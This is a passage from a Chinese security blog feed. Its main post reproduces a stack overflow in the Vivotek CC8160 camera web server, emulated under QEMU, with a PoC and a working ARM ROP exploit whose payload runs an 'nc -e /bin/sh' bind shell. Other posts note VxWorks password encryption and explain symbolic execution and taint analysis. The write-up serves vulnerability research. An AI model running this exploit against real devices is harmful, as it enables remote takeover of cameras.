alt></p><p>【密码通过vxEncrypt加密（VxWorks 5.x系统默认加密方式）】</p><blockquote><p>reference:</p><p><a href="https://paper.seebug.org/613/#1" target="_blank" rel="noopener">https://paper.seebug.org/613/#1</a></p><p><a href="https://blog.csdn.net/weixin_43815930/article/details/107646507" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43815930/article/details/107646507</a></p><p><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;固件下载地址：&lt;a href=&quot;https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin&quot; target=&quot;_blank&quot; rel=&quot;noo</summary>
      
    
    
    
    <category term="笔记" scheme="p1Kk.github.io/categories/笔记/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>vivotek 摄像头栈溢出漏洞复现</title>
    <link href="p1Kk.github.io/2021/04/14/iot/vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>p1Kk.github.io/2021/04/14/iot/vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-13T16:00:00.000Z</published>
    <updated>2021-04-17T01:24:11.463Z</updated>
    
    <content type="html"><![CDATA[<p>固件影响版本：太多了，以CC8160 为例</p><p>固件下载地址：<a href="https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip" target="_blank" rel="noopener">https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip</a></p><h1 id="环境修复"><a href="#环境修复" class="headerlink" title="环境修复"></a>环境修复</h1><p>固件解包不多说，查看一下漏洞文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./usr/sbin/httpd</span></span><br><span class="line">./usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec ./usr/sbin/httpd</span></span><br><span class="line">[*]</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user-mod"></a>user-mod</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-arm-static ) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">[14/Apr/2021:13:50:39 +0000] src/boa.c:284 (main) - can't open /dev/null: No such file or directory</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决：</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch ./dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">Could not open boa.conf for reading.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 有这个文件吗？在主目录下也没有找到这个boa.conf文件。进入ida查看，其实是要打开/etc/conf.d/boa/boa.conf，但是</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ll ./etc/conf.d</span></span><br><span class="line">lrwxrwxrwx 1 kk kk 23 Dec  6  2016 ./etc/conf.d -&gt; ../mnt/flash/etc/conf.d</span><br><span class="line"><span class="meta">#</span><span class="bash"> 但是并没有这个../mnt等文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最终在_31...目录下找到了boa.conf，在./defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一下文件夹再粘贴，我还把相对路径给理解错了，这里mnt和etc是同一级的</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp -r ../../defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d ./mnt/flash/etc/conf.d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">gethostbyname:: Success</span><br><span class="line"><span class="meta">#</span><span class="bash"> 看见success，其实没跑起来，ida查看引用，是利用了gethostbyname()函数，返回rlimits结构体中通过主机名找到的ip地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts</span></span><br><span class="line">127.0.0.1 Network-Camera localhost</span><br><span class="line"><span class="meta">$</span><span class="bash"> hostname</span></span><br><span class="line">ubuntu</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改为</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts </span></span><br><span class="line">127.0.0.1 ubuntu localhost</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 再次运行，虽然有错误（AM_ParseConfigFile函数，不是很清楚），但是已经成功运行起来了</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:01:01:02 +0000] boa: starting server pid=3511, port 80</span><br><span class="line"><span class="meta">$</span><span class="bash"> ps aux | grep httpd</span></span><br><span class="line">root       3511  0.8  0.0 4240192 6216 pts/0    Sl   18:01   0:00 ./qemu-arm-static ./usr/sbin/httpd</span><br><span class="line">kk         3514  0.0  0.0  14436  1068 pts/0    S+   18:01   0:00 grep --color=auto httpd</span><br></pre></td></tr></table></figure><h2 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys-mod"></a>sys-mod</h2><ol><li>额…我的磁盘有点儿问题</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo guestmount -a debian_wheezy_armel_standard.qcow2 -m /dev/sda2 /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp -rf ./squashfs-root /mnt/root/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo guestunmount /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc# 默认/dev和/proc在chroot的时候是不会挂载的，需要手动挂载。</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br></pre></td></tr></table></figure><ol start="2"><li>用这个<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo tunctl -t tap0 -u `whoami`</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ifconfig tap0 192.168.65.1/24</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append <span class="string">"root=/dev/sda1"</span>  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"></span><br><span class="line">; 进入后使用ftp进行文件传输</span><br><span class="line">root@debian-armel:~# ifconfig eth0 192.168.65.2/24</span><br><span class="line">; 传输完成后</span><br><span class="line">root@debian-armel:~# mount -t proc /proc ./squashfs-root/proc; 默认/dev和/proc在chroot的时候是不会挂载的，需要手动挂载。</span><br><span class="line">root@debian-armel:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armel:~# chroot ./squashfs-root /bin/sh</span><br><span class="line">/ # ls</span><br><span class="line">bin              home             qemu-arm-static  tmpfs</span><br><span class="line">dev              lib              root             usr</span><br><span class="line">drivers          linuxrc          sbin             var</span><br><span class="line">etc              mnt              sys              www</span><br><span class="line">gdbserver        proc             tmp</span><br><span class="line">; 同上面usermod，修改一下hostname就可以跑起来了</span><br><span class="line">/ # ./usr/sbin/httpd</span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[0] is /video3.mjpg</span><br><span class="line">[debug] after ini, server_push_uri[1] is /video4.mjpg</span><br><span class="line">AM_ParseConfigFile failed</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)</span><br><span class="line">[15/Apr/2021:05:49:21 +0000] boa: starting server pid=2400, port 80</span><br><span class="line">/ # ps T | grep httpd</span><br><span class="line"> 2400 root      1336 S    ./usr/sbin/httpd</span><br><span class="line"> 2406 root      1368 S    grep httpd</span><br><span class="line">/ # ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk '&#123;print $1&#125;');远程调试</span><br></pre></td></tr></table></figure></li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞位于<code>/usr/sbin/httpd</code>中的<code>sub_17F80</code>，是由于Content-Length引起的溢出</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFstrncpy.png" alt></p><blockquote><ul><li><p>strncpy()用来复制字符串的前n个字符，其原型为：<br><code>char * strncpy(char *dest, const char *src, size_t n);</code></p><p>【参数说明】dest 为目标字符串指针，src 为源字符串指针。</p><p>strncpy()会将字符串src前n个字符拷贝到字符串dest。</p><p>不像strcpy()，<strong>strncpy()不会向dest追加结束标记’\0’</strong>，这就引发了很多不合常理的问题，将在下面的示例中说明。</p><p>注意：src 和 dest 所指的内存区域不能重叠，且 dest 必须有足够的空间放置n个字符。</p><p>【返回值】返回字符串dest。</p></li><li><p>strchr() 用来查找某字符在字符串中首次出现的位置，其原型为：<br><code>char * strchr (const char *str, int c);</code></p><p>【参数】str 为要查找的字符串，c 为要查找的字符。</p><p>strchr() 将会找出 <strong>str 字符串中第一次出现的字符 c 的地址</strong>，然后将该地址返回。</p><p>注意：字符串 str 的结束标志 NUL 也会被纳入检索范围，所以 str 的组后一个字符也可以被定位。</p><p>【返回值】如果找到指定的字符则返回该字符所在地址，否则返回 NULL。</p><p>返回的地址是字符串在内存中随机分配的地址再加上你所搜索的字符在字符串位置。设字符在字符串中首次出现的位置为 i，那么返回的地址可以理解为 str + i。</p></li></ul><p><a href="https://www.huaweicloud.com/articles/11adf8c5e55a63fec81650988a8eeedb.html" target="_blank" rel="noopener">GET POST PUT DELETE的区别</a></p></blockquote><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">&quot;Content-Length&quot;:&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure><p>可以测出偏移是0x33（额我和网上别人的偏移不一样呢）</p><p>栈溢出就利用ROP来做，关于arm以前也做过。所以就考虑将参数放入R0，目标函数system放到PC中</p><blockquote><ol><li><p>参数传递</p><p>前4个参数通过R0 ~ R3传递，第4个参数需要通过sp访问，第5个参数需要sp+4访问，第n个参数需要通过sp + 4*(n-4)访问；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复R0~R3的值</p></li><li><p>在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12是临时寄存器，使用不需要保存</p></li><li><p>子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p></li></ol></blockquote><p>使用ROPgadget查找可用的ROP链，在httpd中地址都含有00，对于strncpy会截断无法使用，在libc中加上基址以后就好很多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libuClibc-0.9.33.3-git.so --only &quot;pop|mov&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">0x00033100 : pop &#123;r0, pc&#125;# 这条是最简单的，但是由于地址存在00，会被截断，所以考虑先传入其他寄存器，再由其他寄存器传递给R0</span><br><span class="line">0x00048784 : pop &#123;r1, pc&#125;# 先传递给R1，顺便将第二条gadget传给pc</span><br><span class="line">0x00016aa4 : mov r0, r1 ; pop &#123;r4, r5, pc&#125;# 第二条gadget，将R1传递给R0，再将栈中的内容依次传递给r4\r5\pc</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>虽然说这种设备一般都不会开启ASLR，但是这个debian默认开启的，对我们调试程序很不友好，先关掉</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ # echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>所以查看libc基址可以使用gdb中的<code>vmmap</code>或在debian虚拟机中使用<code>cat /proc/xxxx[进程号]/maps</code>查看</p><p>综上，构造payload为<code>&quot;a&quot;*offset+p32(rop1)+p32(r0-&gt;cmd_addr)+p32(rop2)+p32(r4_content)+p32(r5_content)+p32(sys_addr)+cmd</code></p><p>这个cmd字符串可以先随便写，然后到栈中查找这个字符串就可以得到地址（实际地址需要将查到的地址再-1）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">libc_base = 0xb6f2d000</span><br><span class="line">libc = ELF(&quot;./lib/libuClibc-0.9.33.3-git.so&quot;)</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">rop1 = libc_base + 0x00048784 # pop &#123;r1, pc&#125;</span><br><span class="line">rop2 = libc_base + 0x00016aa4 # mov r0, r1 ; pop &#123;r4, r5, pc&#125;</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line">success(&quot;rop1 = &quot;+hex(rop1))</span><br><span class="line">success(&quot;rop2 = &quot;+hex(rop2))</span><br><span class="line">cmd = &quot;nc -lp 2222 -e /bin/sh;&quot;</span><br><span class="line">cmd_addr = 0xbeffeb64</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">&quot;Content-Length&quot;:&quot;a&quot;*0x33 + p32(rop1) + p32(cmd_addr) + p32(rop2) + &quot;a&quot;*4 + &quot;b&quot;*4 + p32(sys_addr) + cmd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.65.2&quot; + &quot;/cgi-bin/admin/upgrade.cgi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/vivotekStackOFshell.png" alt></p><blockquote><p>Reference:</p><p><a href="https://xz.aliyun.com/t/5054#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054#toc-0</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;固件影响版本：太多了，以CC8160 为例&lt;/p&gt;
&lt;p&gt;固件下载地址：&lt;a href=&quot;https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip&quot; target=&quot;_blank&quot; rel=&quot;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="p1Kk.github.io/categories/漏洞复现/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="栈溢出" scheme="p1Kk.github.io/tags/栈溢出/"/>
    
    <category term="摄像头" scheme="p1Kk.github.io/tags/摄像头/"/>
    
  </entry>
  
  <entry>
    <title>符号执行&amp;污点分析简述</title>
    <link href="p1Kk.github.io/2021/04/04/others/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C&amp;%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    <id>p1Kk.github.io/2021/04/04/others/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C&amp;%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/</id>
    <published>2021-04-03T16:00:00.000Z</published>
    <updated>2021-10-16T09:14:04.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h1><p>给一个结果，求输入。</p><p>根据发展状况,可以将符号执行分为经典符号执行、动态符号执行和选择性符号执行</p><h2 id="经典符号执行"><a href="#经典符号执行" class="headerlink" title="经典符号执行"></a>经典符号执行</h2><p>经典符号执行的核心思想是通过使用符号值来代替具体值作为程序输入，并用符号表达式来表示与符号值相关的程序变量的值。经典符号执行<strong>并不真实地执行</strong>,而是基于解析程序，通过符号值模拟执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">twice</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testme</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">z = twice(y);</span><br><span class="line"><span class="keyword">if</span> (z == x)&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt; y+<span class="number">10</span>)</span><br><span class="line">ERROR;</span><br><span class="line">&#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">x = sym_input();</span><br><span class="line">y = sym_input();</span><br><span class="line">testme(x, y);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>符号执行使用<strong>符号值</strong>代替具体值，在符号执行过程中，符号执行引擎始终保持一个状态信息(pc, π, σ)，其中：</p><p>​    1）pc 指向需要处理的下一条程序语句，其可以是赋值语句、条件分支语句或者是跳转语句。</p><p>​    2）π 指代路径约束信息，表示为执行到程序特定语句需要经过的条件分支，以及各分支处关于符号 α_i 的表达式。在分析的过程中，将其初始定义为 π = true。</p><p>​    3）σ 表示与程序变量相关的符号值集，包括含有具体值和符号值 α<sub>i</sub> 的表达式</p><p>据此分析上述代码段：</p><ul><li>开始执行</li></ul><p>​    符号变量σ : α, β </p><p>​    初始状态为σ : {x → α, y → β}; π＝true</p><ul><li>执行到第6行</li></ul><p>​    σ : {x → α, y → β, z → 2∗β}; π＝true</p><ul><li>执行到第7行，延伸出两个分析状态</li></ul><p>​    true路径：if z == x → σ : {x → α, y → β, z → 2∗β}; π: 2∗β == α</p><p>​                                true路径：if x &gt; y+10 → σ : {x → α, y → β, z → 2∗β}; π: {2∗β == α ∩ α &gt; β+10}</p><p>​                                false路径：if x &gt; y+10 → σ : {x → α, y → β, z → 2∗β}; π: {2∗β == α ∩ α &lt;= β+10}</p><p>​    false路径：if z != x → σ : {x → α, y → β, z → 2∗β}; π: 2∗β != α</p><p>传统符号执行在原理上是 可以对程序路径进行全覆盖的,而且可以针对每一路径都生 成符合该路径的测试用例。</p><ul><li><p>执行路径（execution path）true false序列</p></li><li><p>执行树（execution tree）</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211012161441293.png" alt="image-20211012161441293"></p></li></ul><h2 id="动态符号执行"><a href="#动态符号执行" class="headerlink" title="动态符号执行"></a>动态符号执行</h2><p>符号执行在发展过程中出现了一种叫做<strong>动态符号执行</strong>的方法（concrete and symbolic， <code>concolic</code>）。动态符号执行是<strong>以具体数值作为输入</strong>来模拟执行程序代码，与传统静态符号执行相比，其输入值的表示形式不同。动态符号执行使用具体值作为输入，同时启动代码模拟执行器，并从当前路径的分支语句的谓词中搜集所有符号约束。然后修改该符号约束内容构造出一条新的可行的路径约束，并用约束求解器求解出一个可行的新的具体输入，接着符号执行引擎对新输入值进行一轮新的分析。通过使用这种输入迭代产生变种输入的方法，理论上所有可行的路径都可以被计算并分析一遍。<br>动态符号执行相对于静态符号执行的优点是每次都是具体输入的执行，在模拟执行这个过程中，<strong>符号化的模拟执行比具体化的模拟执行的开销大很多</strong>；并且模拟执行过程中所有的变量都为具体值，而不必使用复杂的数据结构来表达符号值，使得模拟执行的花销进一步减少。但是动态符号执行的结果是对程序的所有路径的一个下逼近，即其最后<strong>产生路径的集合应该比所有路径集合小</strong>，但这种情况在软件测试中是允许的。</p><h2 id="正向的符号执行"><a href="#正向的符号执行" class="headerlink" title="正向的符号执行"></a>正向的符号执行</h2><p>正向的符号执行用于全面地对程序代码进行分析，可分为过程内分析和过程间分析。</p><ul><li><p>过程内分析：只对单个函数的代码进行分析</p></li><li><p>过程间分析（或全局分析）：对整个软件代码进行上下文敏感的分析，在当前函数入口点要考虑当前函数的调用信息和环境信息等</p></li></ul><h2 id="逆向的符号执行"><a href="#逆向的符号执行" class="headerlink" title="逆向的符号执行"></a>逆向的符号执行</h2><p>逆向的符号执行用于对可能存在漏洞的部分代码进行有针对性的分析。通过分析这些程序语句，可以得到变量取值满足怎样的约束表示程序存在漏洞，将这样的约束记录下来，在之后的分析中，通过逆向分析判断程序存在漏洞的约束是否是可以满足的。通过不断地记录并分析路径条件，检查程序是否可能存在带有程序漏洞的路径。</p><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>路径状态空间爆炸问题：由于每一个条件分支语句都可能会使当前路径再分出一条新的路径，特别是遇到循环分支时，每增加一次循环都将增加一条新路径，因此这种增长是指数级的。</p><ul><li>解决：比如规定每个过程内的分析路径的数目上限，或者设置时间上限和内存上限等来进行缓解。</li></ul><h1 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h1><p>污点分析可以抽象成一个三元组<code>&lt;sources,sinks,sanitizers&gt;</code>的形式</p><p>source ：<strong>污点源</strong>，代表直接引入不受信任的数据或者机密数据到系统中；</p><p>sink：<strong>污点汇聚点</strong>，代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性)；</p><p>sanitizer：<strong>无害处理</strong>，代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害。</p><p><strong>污点分析</strong>是一种跟踪并分析污点信息在程序中流动的技术。在漏洞分析中，使用污点分析技术将所感兴趣的数据（通常来自程序的外部输入）标记为污点数据，然后通过跟踪和污点数据相关的信息的流向，可以知道它们是否会影响某些关键的程序操作，进而挖掘程序漏洞。即将程序是否存在某种漏洞的问题转化为<strong>污点信息是否会被 Sink 点上的操作所使用</strong>的问题。</p><ul><li><strong>显式信息流</strong>：通过数据依赖传播的信息流</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">scanf(&quot;%d&quot;, &amp;x);    // Source 点，输入数据被标记为污点信息，并且认为变量 x 是污染的</span><br><span class="line">[...]</span><br><span class="line">y = x + k;          // 如果二元操作的操作数是污染的，那么操作结果也是污染的，所以变量 y 也是污染的</span><br><span class="line">[...]</span><br><span class="line">x = 0;              // 如果一个被污染的变量被赋值为一个常数，那么认为它是未污染的，所以 x 转变成未污染的</span><br><span class="line">[...]</span><br><span class="line">while (i &lt; y)       // Sink 点，如果规定循环的次数不能受程序输入的影响，那么需要检查 y 是否被污染</span><br></pre></td></tr></table></figure><ul><li><strong>隐式信息流</strong>：通过控制依赖传播的信息流</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (x &gt; 0)// 变量 y 的取值依赖于变量 x 的取值，如果变量 x 是污染的，那么变量 y 也应该是污染的。</span><br><span 